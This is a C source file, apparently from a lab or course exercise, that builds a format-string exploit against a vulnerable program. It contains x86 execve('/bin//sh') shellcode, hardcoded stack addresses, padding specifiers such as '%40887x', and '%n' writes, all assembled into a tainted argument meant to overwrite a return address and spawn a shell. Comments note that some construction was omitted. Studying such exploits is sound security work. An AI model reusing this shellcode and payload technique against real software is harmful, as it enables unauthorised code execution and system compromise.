/*
 * formatstringtester.c
 *
 *  Created on: Sep 21, 2016
 *      Author: Reuben Johnston
 */

int real_main(int argc, char *argv[]);

typedef int bool;
#define true 1
#define false 0

#define DEBUG 1
#define FORMATBUFFERSIZE 2048

union
{
    unsigned long int integer;
    unsigned char byte[4];
} intUnion;

union
{
    unsigned short int shortinteger;
    unsigned char byte[2];
} shortUnion;

//char shellcode[] = "AAAAAAAAAAAAAAAAAAAAAAAAA";

char shellcode[] = \
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0a\x04\x01\xcd\x80\x90";//this shellcode has x3 NOPs for padding, length=28
//0x804a050
char spacer[] = \
"%08x.";//This spacer was altered from what is present in the complete version of the exploit
//char spacer[] = "\x90\x90\x90\x90\x90\x90";

char modifier[] = \
		"%08n";

char addr[] = \
		"\x8c\xe4\xff\xbf";

char chut[] = \
		"%40887x";

char lund[] = \
		"\x8f\xe4\xff\xbf";

char bable[] = \
		"%99x";

int main(int argc, char *argv[]) {
    int ret = 0;
    char taintedbuf[2048] __attribute__ ((aligned (8)));
    char tempstr[512];
    char formatstr[512];
    unsigned long int shellcodeaddr, retfptraddr;
    short int pad1, pad2, pad3, pad4;
    int shellcodesize, spacersize, shellcodecnt, spacercnt;
    int taintedbufWritePtr, taintedbufWriteCnt;

    if (argc == 3) {
       sscanf(argv[1],"%lx",&shellcodeaddr);
        sscanf(argv[2],"%lx",&retfptraddr);
    }
     else {
        //To prompt user for program arguments in eclipse, use ${string_prompt:shellcodeaddr:0xffffac40} ${string_prompt:retfptraddr:0xffffbc5c}
        printf("warning, incorrect args.  need to enter argv[1]=shellcodeaddr and argv[2]=retfptraddr\n");
        return (-1);
    }

    printf("shellcodeaddr=0x%lx, retfptraddr=0x%lx\n",shellcodeaddr, retfptraddr);

	memset(taintedbuf,0,sizeof(taintedbuf));//clear the buffer

    //Construction of the tainted buffer has been omitted

    int i=0;
    int s=0;
    int f=0;
    int x=0;
    int l=0;
    int h=0;
    int p=0;
    int j=0;
    int a=0;
    int b=0;
/*
    for(;x<100;++x)
    {
    for(;f<sizeof(spacer)/sizeof(char);++f)
        {
        	taintedbuf[i]=spacer[f];
        	++i;
        }
    	f=0;
    }

    for(;s<sizeof(shellcode)/sizeof(char);++s)
    {
    	taintedbuf[i]=shellcode[s];
    	++i;
    }
*/
    //taintedbuf[i]="\x20";
    //i = i + 1;

/*
    for(;x<2080;++x)
       {
           	taintedbuf[x]="A";
       }
*/
    printf("\nThe length of spacer buffer is: %d\n", strlen(spacer));

    for(i=0;i<strlen(shellcode);i++)
    {
    	taintedbuf[i] = shellcode[x];
    	x++;
    }

    for(l=0;l<4;l++)
    {
    	taintedbuf[i++] = addr[l];
    }

    for(j=0;j<4;j++)
    {
    	taintedbuf[i++] = lund[j];
    }
/*
    for(s=0;s<5;s++)
    {
    	taintedbuf[i++] = '%';
    }
*/

    for(s=0;s<13;s++)
    {
    	for(f=0;f<5;f++)
    	{

    		taintedbuf[i++] = spacer[f];

    	}
    	f=0;
    }

    for(p=0;p<7;p++)
    {
    	taintedbuf[i++] = chut[p];
    }
    /*
    for(h=0; h<7; h++)
    {
    	taintedbuf[i++] = chut[h];
    }
    */
    for(f=0;f<5;f++)
        	{

        		taintedbuf[i++] = modifier[f];

        	}
    for(a=0;a<4;a++)
        	{

        		taintedbuf[i++] = bable[a];

        	}


    for(b=0;b<5;b++)
        	{

        		taintedbuf[i++] = modifier[b];

        	}


    printf("The value of i now is: %d", i);
    printf("\nThe length of tainted buffer is: %d\n", strlen(taintedbuf));
    argc=2;//real_main's argc should only be 2
    argv[1]=taintedbuf;//real_main's argv[1] is the buffer to be written to usagefile
    printf("\n");
    printf("\nThe length of argv[1] is: %d\n", strlen(argv[1]));
    ret = real_main(argc, argv);

    return (ret);
}
